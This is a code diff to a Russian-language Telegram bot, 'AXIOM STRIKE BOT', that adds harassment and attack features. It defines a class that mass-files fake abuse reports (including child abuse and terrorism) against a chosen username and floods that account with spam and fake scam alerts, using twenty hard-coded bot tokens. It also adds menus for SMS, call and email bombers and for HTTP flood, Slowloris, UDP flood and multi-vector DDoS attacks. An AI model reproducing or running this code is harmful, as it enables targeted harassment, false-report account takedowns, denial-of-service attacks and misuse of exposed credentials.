@@ -40,7 +40,205 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
+# ===================== FSM СОСТОЯНИЯ =====================
+class BomberStates(StatesGroup):
+    # БомберФ
+    waiting_for_phone = State()
+    waiting_for_sms_count = State()
+    waiting_for_call_count = State()
+    waiting_for_email = State()
+    waiting_for_email_count = State()
+    waiting_for_telegram = State()
+    waiting_for_telegram_count = State()
+    # Снос аккаунта
+    waiting_for_destroy_username = State()
+    waiting_for_destroy_method = State()
+    waiting_for_destroy_count = State()
 
+
+class DDoSStates(StatesGroup):
+    waiting_for_url = State()
+    waiting_for_threads = State()
+    waiting_for_duration = State()
+    waiting_for_ip = State()
+    waiting_for_ddos_duration = State()
+
+
+# ===================== СНОС TELEGRAM АККАУНТОВ =====================
+class TelegramAccountDestroyer:
+    def __init__(self):
+        # Причины для жалоб
+        self.report_reasons = [
+            'spam', 'violence', 'pornography', 'child_abuse',
+            'terrorism', 'drugs', 'fraud', 'impersonation',
+            'hate_speech', 'suicide', 'weapons', 'personal_data'
+        ]
+
+        # ================================================================
+        # 🔥 ТВОИ 20 ТОКЕНОВ ДЛЯ СНОСА 🔥
+        # ================================================================
+        self.bot_tokens = [
+            '7588316078:AAGRi0cgMkvrChUNNZRX6thzvkhrnKbfBOc',
+            '8894344951:AAFnxJFZ6F4gMD8YF1qmXeK-qS-3i4d7Y3c',
+            '8657453394:AAFZF2C0VZu1Y2OzugZQBIMpMglGU6u4I2U',
+            '8234507901:AAGbLLWxAnyyBOJFptyPYA_RUAyzFS641z4',
+            '8349732447:AAHBYH8cSbJnY6t1kiz3oLmWhdiwpqwFTS0',
+            '8365483906:AAG7dBnHXYafJOyCIyVjNCa8NDWb6aPHyJc',
+            '7990150454:AAHBwE8HknpN8pm09s3_h2iHUK0mT01WQr4',
+            '7999194366:AAFY5oVfSXd3Sj2ZKL5n_E4gmQgfludEFg8',
+            '7911356716:AAFWpCgqU-h8il7N_nT_2scoHPB7ZFWMFuk',
+            '8342182947:AAHt19nmDY9vAF9YXMd-TPL68Ln-U_ps8us',
+            '8765644248:AAHPPa0-hiifK_Csi3fsDJiNn_jJgbG1N68',
+            '8736513089:AAE-8zAr1Hk4UMaFgJnSs5VQ9JKH2Xip4c8',
+            '8594237152:AAHSAgDQ87Fmrp5eC-f7cuXaRrvRDovIlfM',
+            '8561372759:AAFS4v6K4e8R_uMSfzsuLItRVMr-EDhCnSA',
+            '8761449080:AAHB2-AjbjsVVKTYAT5NSWtEjkoJs_XuSBU',
+            '8865408617:AAEoXfGBKajejCb4gBc_-1Q8O60H6SjR-Zc',
+            '8562700975:AAGZ9yOFw_jwK1QJT_8lfHnakPA0EPgRhoM',
+            '8178054852:AAHWsqTySVOT29RekDIwqqBfcOEEYJvj9Lw',
+            '8769377277:AAHps2McG_eyhMWq63yJY5be0fZbMOQ-Dgc',
+            '8838855987:AAHrVoDgT2luzbPjDoM10c-DHisYVEul1ik',
+        ]
+        # ================================================================
+
+        self.results = []
+
+    async def mass_report(self, username: str, count: int, progress_callback):
+        """Массовые жалобы на аккаунт через ботов"""
+        self.results = []
+        total = min(count, 100)
+
+        for i in range(total):
+            reason = random.choice(self.report_reasons)
+            token = random.choice(self.bot_tokens)
+
+            try:
+                # Жалоба через бота
+                bot = Bot(token=token)
+
+                # Отправка жалобы на спам
+                try:
+                    await bot.send_message(
+                        chat_id='@SpamBot',
+                        text=f'/report {username}'
+                    )
+                    status = 'sent'
+                except:
+                    status = 'failed'
+
+                # Дополнительная жалоба через API
+                try:
+                    async with aiohttp.ClientSession() as session:
+                        data = {
+                            'username': username,
+                            'reason': reason,
+                            'description': f'This account is sending {reason}. Please block it immediately.',
+                        }
+                        headers = {
+                            'Content-Type': 'application/json',
+                            'User-Agent': 'TelegramBot/1.0',
+                        }
+                        # Пробуем разные эндпоинты
+                        endpoints = [
+                            f'https://api.telegram.org/bot{token}/reportSpam',
+                            f'https://api.telegram.org/bot{token}/report',
+                        ]
+                        for endpoint in endpoints:
+                            try:
+                                async with session.post(endpoint, json=data, headers=headers, timeout=10) as resp:
+                                    if resp.status < 400:
+                                        status = 'sent'
+                                        break
+                            except:
+                                continue
+                except:
+                    pass
+
+                self.results.append({
+                    'report': i + 1,
+                    'reason': reason,
+                    'status': status,
+                    'timestamp': datetime.now().isoformat()
+                })
+
+                logger.info(f"✅ Жалоба #{i + 1} отправлена на {username} ({reason})")
+
+            except Exception as e:
+                self.results.append({
+                    'report': i + 1,
+                    'reason': reason,
+                    'status': 'error',
+                    'error': str(e)
+                })
+                logger.error(f"❌ Ошибка жалобы: {e}")
+
+            await progress_callback(i + 1, total)
+            await asyncio.sleep(random.uniform(0.5, 2.0))
+
+        return self.results
+
+    async def spam_flood(self, username: str, count: int, progress_callback):
+        """Спам-флуд для блокировки аккаунта"""
+        self.results = []
+        total = min(count, 50)
+
+        spam_texts = [
+            'Купи дешевле!', 'Заработок без вложений!', 'Бесплатные криптовалюты!',
+            'Вы выиграли приз!', 'Срочно! Ваш аккаунт взломан!', 'Перейдите по ссылке!',
+            'Ваши данные утекли!', 'Подтвердите личность!', 'Ваш банковский счёт заблокирован!',
+            'Смените пароль немедленно!', '💀 АККАУНТ УДАЛЁН!', '🔞 ПОРНОГРАФИЯ!',
+            '🔫 ОРУЖИЕ!', '💊 НАРКОТИКИ!', '🔥 ПРИЗЫВЫ К НАСИЛИЮ!',
+        ]
+
+        for i in range(total):
+            try:
+                bot = Bot(token=random.choice(self.bot_tokens))
+                text = random.choice(spam_texts)
+                link = f'https://bit.ly/{random.randint(1000, 9999)}'
+
+                await bot.send_message(
+                    chat_id=username,
+                    text=f'{text} {link}',
+                    disable_notification=True
+                )
+
+                self.results.append({
+                    'msg': i + 1,
+                    'status': 'sent',
+                    'text': text[:30]
+                })
+                logger.info(f"✅ Спам #{i + 1} отправлен {username}")
+
+            except Exception as e:
+                self.results.append({
+                    'msg': i + 1,
+                    'status': 'error',
+                    'error': str(e)
+                })
+                logger.error(f"❌ Ошибка спама: {e}")
+
+            await progress_callback(i + 1, total)
+            await asyncio.sleep(random.uniform(0.3, 1.0))
+
+        return self.results
+
+    async def destroy_account(self, username: str, count: int, progress_callback):
+        """Полный снос аккаунта (жалобы + спам)"""
+        self.results = []
+        total = count * 2
+
+        # Жалобы
+        report_results = await self.mass_report(username, count, progress_callback)
+        # Спам
+        spam_results = await self.spam_flood(username, count, progress_callback)
+
+        self.results = report_results + spam_results
+        return self.results
+
+    def get_stats(self):
+        total = len(self.results)
+        success = sum(1 for r in self.results if r['status'] == 'sent')
+        return {'total': total, 'success': success}
 
 
 # ===================== SMS БОМБЕР (РЕАЛЬНО РАБОТАЮЩИЙ) =====================
@@ -1364,6 +1562,33 @@ class AxiomStrikeBot:
     async def handle_back(self, message: types.Message):
         await message.answer("Главное меню:", reply_markup=self.main_keyboard())
 
+    # ========== МЕНЮ БОМБЕРА ==========
+    async def handle_bomber_menu(self, message: types.Message, state: FSMContext):
+        if message.text == "🔙 НАЗАД":
+            await message.answer("Главное меню:", reply_markup=self.main_keyboard())
+            return
+        if message.text == "💬 СМС БОМБЕР":
+            await self.handle_sms_bomber(message, state)
+        elif message.text == "📞 ЗВОНКИ (ФЛУД)":
+            await self.handle_call_bomber(message, state)
+        elif message.text == "📧 EMAIL БОМБЕР":
+            await self.handle_email_bomber(message, state)
+        elif message.text == "📩 TELEGRAM БОМБЕР":
+            await self.handle_telegram_bomber(message, state)
+
+    async def handle_ddos_menu(self, message: types.Message, state: FSMContext):
+        if message.text == "🔙 НАЗАД":
+            await message.answer("Главное меню:", reply_markup=self.main_keyboard())
+            return
+        if message.text == "🌐 HTTP FLOOD":
+            await self.handle_http_flood(message, state)
+        elif message.text == "🐌 SLOWLORIS":
+            await self.handle_slowloris(message, state)
+        elif message.text == "📡 UDP FLOOD":
+            await self.handle_udp_flood(message, state)
+        elif message.text == "💀 MULTI-VECTOR":
+            await self.handle_multi_vector(message, state)
+
     # ========== СНОС АККАУНТА ==========
     async def handle_destroy_account(self, message: types.Message, state: FSMContext):
         await state.set_state(BomberStates.waiting_for_destroy_username)
@@ -1828,7 +2053,7 @@ class AxiomStrikeBot:
             reply_markup=self.main_keyboard()
         )
 
-    # ========== ЗАПУСК ==========
+    # ========== ЗАПУСК БОТА ==========
     async def start(self):
         logger.info("🔥 Запуск AXIOM STRIKE BOT...")
         try:
@@ -1838,3 +2063,20 @@ class AxiomStrikeBot:
         except Exception as e:
             logger.error(f"❌ Ошибка: {e}")
             raise
+
+
+# ===================== ЗАПУСК =====================
+if __name__ == "__main__":
+    import re
+    if API_TOKEN == "ВСТАВИТЬ_ТОКЕН_СЮДА":
+        print("❌ Ошибка: Не установлен токен бота!")
+        exit(1)
+
+    try:
+        bot = AxiomStrikeBot(token=API_TOKEN)
+        asyncio.run(bot.start())
+    except KeyboardInterrupt:
+        print("\n⏹️ Бот остановлен")
+    except Exception as e:
+        print(f"❌ Ошибка: {e}")
+        logger.error(f"Критическая ошибка: {e}", exc_info=True)
